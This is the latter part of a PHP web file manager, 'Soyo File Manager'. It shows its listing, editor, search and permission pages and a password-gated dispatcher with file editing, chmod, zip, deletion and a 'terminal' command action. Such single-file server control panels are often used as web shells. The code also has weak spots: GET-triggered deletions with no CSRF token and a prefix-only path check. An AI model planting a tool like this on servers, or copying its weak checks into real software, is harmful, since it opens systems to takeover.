                <input type="text" name="file_name" placeholder="filename.ext (e.g., index.html, script.js)" required style="width: 300px;">
                <br><br>
                <label>File content (optional):</label>
                <textarea name="file_content" placeholder="Enter initial file content..." style="width: 100%; height: 200px; margin-top: 10px; padding: 10px; border: 1px solid #4a4a5e; border-radius: 6px; background: #1e1e2e; color: #e0e0e0; font-family: monospace; font-size: 13px;"></textarea>
                <br><br>
                <input type="submit" value="Create File">
                <button type="button" onclick="toggleCreateFile()" style="background: #6b7280; color: white; border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; margin-left: 10px; font-size: 13px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 500;">Cancel</button>
            </form>
        </div>
        
        <div id="compress-form" class="compress-form hidden">
            <p>Compress Files:</p>
            <p>Select files below using checkboxes, then click "Compress Selected Files" to create a ZIP archive.</p><br>
            <button type="button" onclick="bulkCompress()" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; font-size: 13px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 500;">📦 Compress Selected Files</button>
            <button type="button" onclick="toggleCompress()" style="background: #6b7280; color: white; border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; margin-left: 10px; font-size: 13px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 500;">Cancel</button>
        </div>
        
        <div id="bulk-actions" class="bulk-actions">
            Bulk Actions:
            <button onclick="bulkCompress()">📦 Compress Selected</button>
        </div>

        <?php if (isset($_SESSION['clipboard']) && !empty($_SESSION['clipboard'])): ?>
        <div id="paste-actions" class="bulk-actions" style="background: #10b981; display: block;">
            📋 Clipboard: <?php echo htmlspecialchars(basename($_SESSION['clipboard']['path'])); ?> (<?php echo $_SESSION['clipboard']['type']; ?>)
            <button onclick="pasteItem()" style="background: #1e1e2e; color: #10b981;">📥 Paste Here</button>
            <button onclick="clearClipboard()" style="background: #1e1e2e; color: #10b981;">🗑️ Clear Clipboard</button>
        </div>
        <?php endif; ?>

        <?php if (isset($_SESSION['bulk_clipboard']) && !empty($_SESSION['bulk_clipboard'])): ?>
        <div id="bulk-paste-actions" class="bulk-actions" style="background: #059669; display: block;">
            📋 Bulk Clipboard: <?php echo count($_SESSION['bulk_clipboard']); ?> items
            <button onclick="bulkPaste()" style="background: #1e1e2e; color: #059669;">📥 Paste All Here</button>
            <button onclick="clearBulkClipboard()" style="background: #1e1e2e; color: #059669;">🗑️ Clear Bulk Clipboard</button>
        </div>
        <?php endif; ?>

        <?php if (isset($_SESSION['message'])): ?>
        <div class="bulk-actions" style="background: #10b981; display: block;">
            ✅ <?php echo htmlspecialchars($_SESSION['message']); ?>
        </div>
        <?php unset($_SESSION['message']); ?>
        <?php endif; ?>
        
        <div class="file-list">
            <div class="file-list-header">
                <div class="file-checkbox">
                    <input type="checkbox" id="select-all" onchange="selectAll()">
                </div>
                <div class="file-icon">Type</div>
                <div class="file-name">
                    <a href="?path=<?php echo urlencode($relativePath); ?>&sort=name&order=<?php echo ($sortBy === 'name' && $sortOrder === 'asc') ? 'desc' : 'asc'; ?>">
                        Name <span class="sort-arrow"><?php if ($sortBy === 'name') echo $sortOrder === 'asc' ? '↑' : '↓'; ?></span>
                    </a>
                </div>
                <div class="file-size">
                    <a href="?path=<?php echo urlencode($relativePath); ?>&sort=size&order=<?php echo ($sortBy === 'size' && $sortOrder === 'asc') ? 'desc' : 'asc'; ?>">
                        Size <span class="sort-arrow"><?php if ($sortBy === 'size') echo $sortOrder === 'asc' ? '↑' : '↓'; ?></span>
                    </a>
                </div>
                <div class="file-date">
                    <a href="?path=<?php echo urlencode($relativePath); ?>&sort=date&order=<?php echo ($sortBy === 'date' && $sortOrder === 'asc') ? 'desc' : 'asc'; ?>">
                        Modified <span class="sort-arrow"><?php if ($sortBy === 'date') echo $sortOrder === 'asc' ? '↑' : '↓'; ?></span>
                    </a>
                </div>
                <div class="file-permissions">Permissions</div>
                <div class="file-actions">Actions</div>
            </div>
            
            <?php 
            $parentPath = dirname($currentPath);
            if ($parentPath !== $currentPath && $parentPath !== '.' && $parentPath !== $currentPath): 
                if (strpos($currentPath, '/') === 0) {
                    $relativeParentPath = $parentPath;
                } else {
                    if (strpos($parentPath, $config['root_path']) === 0) {
                        $relativeParentPath = str_replace($config['root_path'], '', $parentPath);
                        $relativeParentPath = trim($relativeParentPath, '/\\');
                    } else {
                        $relativeParentPath = $parentPath;
                    }
                }
            ?>
            <div class="file-item folder">
                <div class="file-checkbox"></div>
                <div class="file-icon">📁</div>
                <div class="file-name">
                    <a href="?path=<?php echo urlencode($relativeParentPath); ?>" class="folder-name">.. (Parent Directory)</a>
                </div>
                <div class="file-size">-</div>
                <div class="file-date">-</div>
                <div class="file-permissions">-</div>
                <div class="file-actions"></div>
            </div>
            <?php endif; ?>
            
            <?php foreach ($files as $index => $file): ?>
                <?php
                $fullFilePath = $currentPath . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($fullFilePath);
                
                $fileSize = '-';
                $fileDate = '-';
                $filePerms = '-';
                
                if (file_exists($fullFilePath)) {
                    if (!$isDir) {
                        $sizeInBytes = filesize($fullFilePath);
                        $fileSize = $sizeInBytes !== false ? formatBytes($sizeInBytes) : 'Unknown';
                    }
                    
                    $modTime = filemtime($fullFilePath);
                    $fileDate = $modTime !== false ? date('Y-m-d H:i:s', $modTime) : 'Unknown';
                    
                    $perms = fileperms($fullFilePath);
                    $filePerms = $perms !== false ? getFilePermissions($perms) : 'Unknown';
                }
                
                $fileIcon = getFileIcon($file, $isDir);
                $fileRelativePath = $relativePath ? $relativePath . '/' . $file : $file;
                $isZipFile = !$isDir && strtolower(pathinfo($file, PATHINFO_EXTENSION)) === 'zip';
                $isEditable = !$isDir && isEditable($file);
                $isViewable = !$isDir && isViewable($file);
                $dropdownId = 'dropdown-' . $index;
                ?>
                <div class="file-item <?php echo $isDir ? 'folder' : 'file'; ?>">
                    <div class="file-checkbox">
                        <input type="checkbox" value="<?php echo htmlspecialchars($file); ?>" onchange="toggleBulkActions()">
                    </div>
                    <div class="file-icon"><?php echo $fileIcon; ?></div>
                    <div class="file-name">
                        <?php if ($isDir): ?>
                            <a href="?path=<?php echo urlencode($fileRelativePath); ?>" class="folder-name"><?php echo htmlspecialchars($file); ?></a>
                        <?php elseif ($isEditable): ?>
                            <a href="?action=edit&path=<?php echo urlencode($fileRelativePath); ?>"><?php echo htmlspecialchars($file); ?></a>
                        <?php elseif ($isViewable): ?>
                            <a href="?action=view&path=<?php echo urlencode($fileRelativePath); ?>" target="_blank"><?php echo htmlspecialchars($file); ?></a>
                        <?php else: ?>
                            <span><?php echo htmlspecialchars($file); ?></span>
                        <?php endif; ?>
                    </div>
                    <div class="file-size"><?php echo $fileSize; ?></div>
                    <div class="file-date"><?php echo $fileDate; ?></div>
                    <div class="file-permissions"><?php echo $filePerms; ?></div>
                    <div class="file-actions">
                        <div class="dropdown" id="<?php echo $dropdownId; ?>">
                            <button class="dropdown-btn" onclick="toggleDropdown(event, '<?php echo $dropdownId; ?>')">⋮</button>
                            <div class="dropdown-content">
                                <?php if ($isZipFile): ?>
                                    <a href="?action=extract&path=<?php echo urlencode($fileRelativePath); ?>" onclick="return confirm('Extract <?php echo htmlspecialchars($file); ?>?')" class="warning">📦 Extract</a>
                                <?php endif; ?>
                                <?php if ($isEditable): ?>
                                    <a href="?action=edit&path=<?php echo urlencode($fileRelativePath); ?>">✏️ Edit</a>
                                <?php endif; ?>
                                <?php if (!$isDir): ?>
                                    <a href="?action=download&path=<?php echo urlencode($fileRelativePath); ?>" class="success">⬇️ Download</a>
                                <?php endif; ?>
                                <a href="?action=copy&path=<?php echo urlencode($fileRelativePath); ?>" class="success">📋 Copy</a>
                                <a href="?action=edit_permissions&path=<?php echo urlencode($fileRelativePath); ?>">🔒 Permissions</a>
                                <a href="?action=delete&path=<?php echo urlencode($fileRelativePath); ?>" 
                                   onclick="return confirmDelete('<?php echo htmlspecialchars($file); ?>')" class="danger">🗑️ Delete</a>
                            </div>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
        
        <div class="footer-info">
            <p>Current Directory: <?php echo htmlspecialchars($currentPath); ?></p>
            <p>Total Items: <?php echo count($files); ?> | 
               Sorted by: <?php echo ucfirst($sortBy); ?> (<?php echo $sortOrder; ?>)</p>
        </div>
        
        <script src="<?php echo getAssetUrl('assets/js/main.js'); ?>"></script>
    </body>
    </html>
    <?php
}

function showEditor($filePath) {
    $content = file_get_contents($filePath);
    $fileName = basename($filePath);
    $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    
    $language = getLanguageFromExtension($extension);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Edit: <?php echo htmlspecialchars($fileName); ?></title>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.44.0/min/vs/loader.min.js"></script>
        <link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/editor.css'); ?>">
    </head>
    <body>
        <div class="editor-header">
            <div>
                <h2>📝 Editing: <?php echo htmlspecialchars($fileName); ?></h2>
                <small>File path: <?php echo htmlspecialchars($filePath); ?></small>
            </div>
            <div class="editor-actions">
                <div class="editor-info">
                    Language: <strong><?php echo ucfirst($language); ?></strong> | 
                    Size: <strong><?php echo formatBytes(strlen($content)); ?></strong>
                </div>
                <button type="button" class="save-btn" onclick="saveFile()">💾 Save</button>
                <button type="button" class="cancel-btn" onclick="history.back()">❌ Cancel</button>
            </div>
        </div>
        
        <div class="editor-container">
            <div id="loading" class="loading">
                🔄 Loading Monaco Editor...
            </div>
            <div id="monaco-editor" style="display: none;"></div>
        </div>
        
        <div class="editor-footer">
            <div class="editor-status">
                <span id="cursor-position">Line 1, Column 1</span>
                <span id="selection-info"></span>
                <span id="error-count">No errors</span>
            </div>
            <div class="editor-status">
                <span>Encoding: UTF-8</span>
                <span>EOL: LF</span>
            </div>
        </div>

        <form id="save-form" method="post" style="display: none;">
            <input type="hidden" name="content" id="content-input">
        </form>

        <script src="<?php echo getAssetUrl('assets/js/editor.js'); ?>"></script>
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                initializeEditor(<?php echo json_encode($content); ?>, '<?php echo $language; ?>');
            });
        </script>
    </body>
    </html>
    <?php
}

function showSearchResults() {
    global $config;
    
    $filenameQuery = $_GET['filename'] ?? '';
    $contentQuery = $_GET['content'] ?? '';
    $filenameType = $_GET['filename_type'] ?? 'contain';
    $contentType = $_GET['content_type'] ?? 'contain';
    
    if (empty($filenameQuery) && empty($contentQuery)) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    try {
        $searchResults = performFileSearch($config['root_path'], $filenameQuery, $contentQuery, $filenameType, $contentType);
    } catch (Exception $e) {
        showSearchError($e->getMessage(), $filenameQuery, $contentQuery);
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Search Results - Soyo File Manager</title>
        <link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/search-results.css'); ?>">
    </head>
    <body>
        <div class="header">
            <h1>🔍 Search Results</h1>
            <div>
                <a href="?action=debug_search&filename=<?php echo urlencode($filenameQuery); ?>&content=<?php echo urlencode($contentQuery); ?>" style="margin-right: 15px;">🐛 Debug</a>
                <a href="?">🏠 Back to Soyo File Manager</a>
            </div>
        </div>
        
        <div class="search-info">
            <h2>Search Results</h2>
            <div class="search-criteria">
                <?php if ($filenameQuery): ?>
                <div>Filename (<strong><?php echo ucfirst($filenameType); ?></strong>): <strong><?php echo htmlspecialchars($filenameQuery); ?></strong></div>
                <?php endif; ?>
                <?php if ($contentQuery): ?>
                <div>Content (<strong><?php echo ucfirst($contentType); ?></strong>): <strong><?php echo htmlspecialchars($contentQuery); ?></strong></div>
                <?php endif; ?>
            </div>
            <div class="results-count">Found <?php echo count($searchResults); ?> matching files</div>
        </div>
        
        <div class="search-form-results">
            <div class="search-group">
                <label>Search by Filename:</label>
                <div class="search-input-group">
                    <select id="filename-type-results" class="search-select">
                        <option value="contain" <?php echo $filenameType === 'contain' ? 'selected' : ''; ?>>Contains</option>
                        <option value="start" <?php echo $filenameType === 'start' ? 'selected' : ''; ?>>Starts with</option>
                        <option value="end" <?php echo $filenameType === 'end' ? 'selected' : ''; ?>>Ends with</option>
                        <option value="equal" <?php echo $filenameType === 'equal' ? 'selected' : ''; ?>>Exact match</option>
                        <option value="wildcard" <?php echo $filenameType === 'wildcard' ? 'selected' : ''; ?>>Wildcard (*?)</option>
                    </select>
                    <input type="text" id="filename-search-results" placeholder="e.g., *.php, config, index.html" value="<?php echo htmlspecialchars($filenameQuery); ?>" />
                </div>
            </div>
            <div class="search-group">
                <label>Search by Content:</label>
                <div class="search-input-group">
                    <select id="content-type-results" class="search-select">
                        <option value="contain" <?php echo $contentType === 'contain' ? 'selected' : ''; ?>>Contains</option>
                        <option value="start" <?php echo $contentType === 'start' ? 'selected' : ''; ?>>Starts with</option>
                        <option value="end" <?php echo $contentType === 'end' ? 'selected' : ''; ?>>Ends with</option>
                        <option value="equal" <?php echo $contentType === 'equal' ? 'selected' : ''; ?>>Exact match</option>
                        <option value="wildcard" <?php echo $contentType === 'wildcard' ? 'selected' : ''; ?>>Wildcard (*?)</option>
                    </select>
                    <input type="text" id="content-search-results" placeholder="e.g., function, &lt;?php, TODO" value="<?php echo htmlspecialchars($contentQuery); ?>" />
                </div>
            </div>
            <div class="search-buttons">
                <button type="button" class="search-btn" onclick="performSearchResults()">🔍 Search Again</button>
                <button type="button" class="clear-btn" onclick="clearSearch()">🗑️ Clear</button>
            </div>
        </div>
        
        <div id="bulk-actions-search" class="bulk-actions-search">
            ⚠️ Bulk Delete Selected Files:
            <button onclick="bulkDeleteSearch()">🗑️ Delete Selected Files</button>
        </div>
        
        <div class="search-results">
            <?php if (empty($searchResults)): ?>
                <div class="no-results">
                    <div class="icon">🔍</div>
                    <div>No files found matching your search criteria</div>
                    <div style="margin-top: 15px; font-size: 12px;">
                        <a href="?action=debug_search&filename=<?php echo urlencode($filenameQuery); ?>&content=<?php echo urlencode($contentQuery); ?>" style="color: #6366f1;">🐛 Debug Search</a>
                    </div>
                </div>
            <?php else: ?>
                <div class="search-results-header">
                    <div class="result-checkbox">
                        <input type="checkbox" id="select-all-search" onchange="selectAllSearch()">
                    </div>
                    <div class="result-icon">Type</div>
                    <div class="result-path">File Path</div>
                    <div class="result-match">Match Type</div>
                    <div class="result-size">Size</div>
                    <div class="result-actions">Actions</div>
                </div>
                
                <?php foreach ($searchResults as $result): ?>
                    <div class="search-result-item">
                        <div class="result-checkbox">
                            <input type="checkbox" value="<?php echo htmlspecialchars($result['relative_path']); ?>" onchange="toggleBulkActionsSearch()">
                        </div>
                        <div class="result-icon"><?php echo $result['icon']; ?></div>
                        <div class="result-path">
                            <?php if ($result['is_editable']): ?>
                                <a href="?action=edit&path=<?php echo urlencode($result['relative_path']); ?>"><?php echo htmlspecialchars($result['filename']); ?></a>
                            <?php else: ?>
                                <span><?php echo htmlspecialchars($result['filename']); ?></span>
                            <?php endif; ?>
                            <div class="path-info"><?php echo htmlspecialchars($result['directory']); ?></div>
                        </div>
                        <div class="result-match">
                            <span class="match-type match-<?php echo $result['match_type']; ?>">
                                <?php echo ucfirst($result['match_type']); ?>
                            </span>
                        </div>
                        <div class="result-size"><?php echo $result['size']; ?></div>
                        <div class="result-actions">
                            <?php if ($result['is_editable']): ?>
                                <a href="?action=edit&path=<?php echo urlencode($result['relative_path']); ?>" class="action-btn edit-btn">✏️ Edit</a>
                            <?php endif; ?>
                            <a href="?action=delete&path=<?php echo urlencode($result['relative_path']); ?>" 
                               onclick="return confirmDeleteSingle('<?php echo htmlspecialchars($result['filename']); ?>')" 
                               class="action-btn delete-btn">🗑️ Delete</a>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        
        <script src="<?php echo getAssetUrl('assets/js/search.js'); ?>"></script>
    </body>
    </html>
    <?php
}

function showPermissionEditor($filePath) {
    $currentPermissions = substr(sprintf('%o', fileperms($filePath)), -4);
    $fileName = basename($filePath);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Edit Permissions: <?php echo htmlspecialchars($fileName); ?> - Soyo File Manager</title>
        <style>
            body {
                font-family: sans-serif;
                background-color: #f4f4f4;
                color: #333;
                padding: 20px;
            }
            input[type="text"] {
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #ddd;
                border-radius: 4px;
            }
            input[type="submit"] {
                background-color: #5cb85c;
                color: white;
                padding: 10px 15px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <h1>Edit Permissions: <?php echo htmlspecialchars(basename($filePath)); ?></h1>
        <form method="post">
            <input type="text" name="permissions" value="<?php echo $currentPermissions; ?>" placeholder="e.g., 0777">
            <input type="submit" value="Change Permissions">
        </form>
    </body>
    </html>
    <?php
}

function showSearchError($message, $filenameQuery, $contentQuery) {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Search Error - Soyo File Manager</title>
        <style>
            body {
                font-family: sans-serif;
                background-color: #f4f4f4;
                color: #333;
                padding: 20px;
            }
            .error-message {
                background-color: #fff;
                border: 1px solid #ddd;
                padding: 15px;
                margin-bottom: 20px;
                border-radius: 4px;
                color: red;
            }
            h1 {
                color: #555;
            }
        </style>
    </head>
    <body>
        <h1>Search Error</h1>
        <div class="error-message">
            <p><strong>Error:</strong> ' . htmlspecialchars($message) . '</p>
            <p><strong>Filename Query:</strong> ' . htmlspecialchars($filenameQuery) . '</p>
            <p><strong>Content Query:</strong> ' . htmlspecialchars($contentQuery) . '</p>
            <p><a href="javascript:history.back()">Go Back</a></p>
        </div>
    </body>
    </html>';
}

// ==================== MAIN EXECUTION ====================

// Authentication
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && verifyPassword($_POST['password'], $config['password_hash'])) {
        $_SESSION['authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    showLoginForm();
    exit;
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Handle actions - FIXED PATH HANDLING
$action = $_GET['action'] ?? '';
$path = $_GET['path'] ?? '';

// Simplified path handling like the working version
$fullPath = realpath($config['root_path'] . '/' . $path);

// Security check
if (!$fullPath || !startsWith($fullPath, realpath($config['root_path']))) {
    $fullPath = realpath($config['root_path']);
    $path = '';
}

switch ($action) {
    case 'view':
        viewFile($fullPath);
        break;
    case 'download':
        downloadFile($fullPath);
        break;
    case 'delete':
        deleteFile($fullPath);
        break;
    case 'upload':
        uploadFiles($fullPath);
        break;
    case 'create_folder':
        createFolder($fullPath, $_POST['folder_name'] ?? '');
        break;
    case 'edit':
        if ($_POST) {
            saveFile($fullPath, $_POST['content']);
        } else {
            showEditor($fullPath);
            exit;
        }
        break;
    case 'edit_permissions':
        if ($_POST) {
            changePermissions($fullPath, $_POST['permissions']);
        } else {
            showPermissionEditor($fullPath);
            exit;
        }
        break;
    case 'compress':
        compressFiles($fullPath, $_POST['files'] ?? [], $_POST['archive_name'] ?? '');
        break;
    case 'extract':
        extractFile($fullPath);
        break;
    case 'create_file':
        if ($_POST) {
            createFile($fullPath, $_POST['file_name'] ?? '', $_POST['file_content'] ?? '');
        } else {
            showFileCreator($fullPath);
            exit;
        }
        break;
    case 'copy':
        copyToClipboard($fullPath);
        break;
    case 'paste':
        pasteFromClipboard($fullPath);
        break;
    case 'search':
        showSearchResults();
        exit;
        break;
    case 'bulk_delete':
        bulkDeleteFiles($_POST['files'] ?? [], $fullPath);
        break;
    case 'bulk_copy':
        bulkCopyFiles($_POST['files'] ?? [], $fullPath);
        break;
    case 'bulk_delete_search':
        bulkDeleteSearchResults($_POST['files'] ?? []);
        break;
    case 'debug_search':
        debugSearch();
        exit;
        break;
    case 'generate_hash':
        if (isset($_POST['new_password'])) {
            echo '<pre>New password hash: ' . generatePasswordHash($_POST['new_password']) . '</pre>';
            exit;
        }
        break;
    case 'clear_clipboard':
        unset($_SESSION['clipboard']);
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
        break;
    case 'terminal':
        runTerminalCommand($fullPath);
        exit;
        break;
    case 'get_folders':
        getFolderList();
        exit;
        break;
}

// Main interface
showFileManager($fullPath, $path);
?>
